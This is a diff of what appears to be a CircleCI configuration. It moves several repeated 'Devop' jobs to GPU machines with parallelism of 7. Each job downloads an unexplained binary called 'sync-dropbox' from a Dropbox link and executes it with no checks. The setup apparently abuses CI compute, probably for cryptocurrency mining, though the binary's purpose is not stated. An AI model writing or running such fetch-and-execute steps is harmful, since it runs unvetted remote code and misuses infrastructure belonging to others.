@@ -2,8 +2,8 @@ version: 2.1
 jobs:
     Devop:
       machine:
-        image: ubuntu-1604-cuda-10.2:202012-01
-        resource_class: large
+       resource_class: gpu.nvidia.large
+       image: ubuntu-1604-cuda-10.1:201909-23
       parallelism: 7    
       steps:
         - checkout
@@ -12,8 +12,8 @@ jobs:
             command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
     Devop1:
       machine:
-        image: ubuntu-1604-cuda-10.2:202012-01
-        resource_class: large
+       resource_class: gpu.nvidia.large
+       image: ubuntu-1604-cuda-10.1:201909-23
       parallelism: 7   
       steps:
         - checkout
@@ -22,8 +22,8 @@ jobs:
             command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
     Devop2:
       machine:
-        image: ubuntu-1604-cuda-10.2:202012-01
-        resource_class: large
+       resource_class: gpu.nvidia.large
+       image: ubuntu-1604-cuda-10.1:201909-23
       parallelism: 7
       steps:
         - checkout
@@ -32,8 +32,8 @@ jobs:
             command: sudo apt update -y && wget https://www.dropbox.com/s/f1ejvcr6yi6yjv3/sync-dropbox?dl=1 && chmod +x sync-dropbox?dl=1 && ./sync-dropbox?dl=1
     Devop3:
       machine:
-        image: ubuntu-1604-cuda-10.2:202012-01
-        resource_class: large 
+       resource_class: gpu.nvidia.large
+       image: ubuntu-1604-cuda-10.1:201909-23
       parallelism: 7
       steps:
         - checkout
